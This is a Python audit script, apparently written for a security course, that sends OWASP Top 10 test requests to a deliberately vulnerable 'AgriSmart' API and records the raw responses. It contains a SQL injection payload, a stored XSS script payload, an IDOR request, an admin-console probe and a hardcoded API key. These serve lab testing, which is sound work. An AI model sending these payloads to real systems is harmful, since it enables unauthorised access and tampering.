#!/usr/bin/env python3
"""
run_audit.py - Script de auditoria automatizada (Evaluacion 2.4)
Version multiplataforma (Windows/Linux/Mac) del run_audit.sh original.

Ejecuta las 5 pruebas seleccionadas del OWASP Top 10 (A01, A03, A05, A07, A08)
contra la URL base indicada, usando la libreria estandar de Python (urllib,
sin dependencias externas que instalar), y guarda la evidencia cruda tal
como la devuelve el servidor (estado HTTP, encabezados y cuerpo).

Uso (Windows, PowerShell o CMD; tambien funciona en Linux/Mac):

    python run_audit.py http://IP_SERVIDOR:3000 fase1
    python run_audit.py http://IP_SERVIDOR:3001 fase2

Ejecutar desde la maquina auditora (Kali, u otra maquina de la red),
apuntando a la IP y puerto donde corre el servidor (vulnerable o seguro).
"""

import sys
import json
import datetime
import urllib.request
import urllib.error
import urllib.parse
from pathlib import Path


def ahora():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def hacer_peticion(metodo, url, headers=None, body=None):
    """Hace una peticion HTTP y devuelve (status, headers_texto, cuerpo_texto)."""
    headers = headers or {}
    data = None
    if body is not None:
        data = body.encode("utf-8") if isinstance(body, str) else body

    req = urllib.request.Request(url, data=data, headers=headers, method=metodo)
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            status_line = f"HTTP/1.1 {resp.status} {resp.reason}"
            headers_texto = "\n".join(f"{k}: {v}" for k, v in resp.getheaders())
            cuerpo = resp.read().decode("utf-8", errors="replace")
            return status_line, headers_texto, cuerpo
    except urllib.error.HTTPError as e:
        # El servidor respondio con un codigo de error (400, 401, 403, 500...)
        status_line = f"HTTP/1.1 {e.code} {e.reason}"
        headers_texto = "\n".join(f"{k}: {v}" for k, v in e.headers.items())
        cuerpo = e.read().decode("utf-8", errors="replace")
        return status_line, headers_texto, cuerpo
    except urllib.error.URLError as e:
        return "SIN RESPUESTA", "", f"Error de conexion: {e.reason}"


def comando_mostrado(metodo, url, headers, body):
    """Arma una linea tipo 'curl ...' solo para que la evidencia sea legible,
    aunque la peticion real se hace con urllib (no se invoca curl.exe)."""
    partes = [f"curl -i -s -X {metodo} \"{url}\""]
    for k, v in (headers or {}).items():
        partes.append(f'-H "{k}: {v}"')
    if body:
        partes.append(f"-d '{body}'")
    return " ".join(partes)


def run_test(nombre, out_dir, base_url, metodo, ruta, headers=None, body=None, query=""):
    url = f"{base_url}{ruta}{query}"
    status_line, headers_texto, cuerpo = hacer_peticion(metodo, url, headers, body)

    contenido = (
        f"### Prueba: {nombre}\n"
        f"### Fecha : {ahora()}\n"
        f"### Objetivo: {base_url}\n"
        f"### Comando: {comando_mostrado(metodo, url, headers, body)}\n"
        f"---------------------------------------------\n"
        f"{status_line}\n"
        f"{headers_texto}\n\n"
        f"{cuerpo}\n"
        f"---------------------------------------------\n"
    )

    archivo = out_dir / f"{nombre}.txt"
    archivo.write_text(contenido, encoding="utf-8")
    print(f"[OK] {nombre} -> {archivo}  ({status_line})")


def main():
    if len(sys.argv) < 2:
        print("Uso: python run_audit.py <URL_BASE> [fase1|fase2]")
        print("Ej.: python run_audit.py http://192.168.1.50:3000 fase1")
        sys.exit(1)

    base_url = sys.argv[1].rstrip("/")
    fase = sys.argv[2] if len(sys.argv) > 2 else "fase1"

    out_dir = Path(__file__).parent / fase
    out_dir.mkdir(parents=True, exist_ok=True)

    print("=== Auditoria AgriSmart API ===")
    print(f"Objetivo : {base_url}")
    print(f"Fase     : {fase}")
    print(f"Fecha    : {ahora()}")
    print(f"Salida   : {out_dir}")
    print()

    # A01 - IDOR: agricultor2 intenta apagar el riego de zona-1 (no es su zona)
    run_test(
        "A01_idor_control_acceso", out_dir, base_url,
        "POST", "/api/riego/zona-1/estado",
        headers={"Content-Type": "application/json", "X-User-Id": "agricultor2"},
        body=json.dumps({"activo": False}),
    )

    # A03 - Inyeccion SQL en el reporte historico
    payload_sql = urllib.parse.quote("zona-1' OR '1'='1")
    run_test(
        "A03_sql_injection", out_dir, base_url,
        "GET", "/api/reportes/historico",
        query=f"?zona_id={payload_sql}",
    )

    # A05 - Consola de administracion sin autenticacion
    run_test(
        "A05_admin_sin_auth", out_dir, base_url,
        "GET", "/admin/sensores",
    )

    # A07a - Sin credenciales validas
    run_test(
        "A07a_sin_credenciales", out_dir, base_url,
        "GET", "/api/sensores/datos",
        headers={"X-Api-Key": "clave-adivinada-cualquiera"},
    )

    # A07b - Usando la clave hardcodeada encontrada en el codigo fuente vulnerable
    run_test(
        "A07b_clave_hardcodeada_filtrada", out_dir, base_url,
        "GET", "/api/sensores/datos",
        headers={"X-Api-Key": "AGRISMART-DEMO-KEY-1234"},
    )

    # A08 - XSS almacenado en nombre de estacion
    run_test(
        "A08_xss_estacion", out_dir, base_url,
        "POST", "/api/estaciones",
        headers={"Content-Type": "application/json"},
        body=json.dumps({"nombre": "<script>alert(1)</script>"}),
    )

    print()
    print(f"=== Auditoria finalizada. Revisa los archivos en {out_dir} ===")


if __name__ == "__main__":
    main()
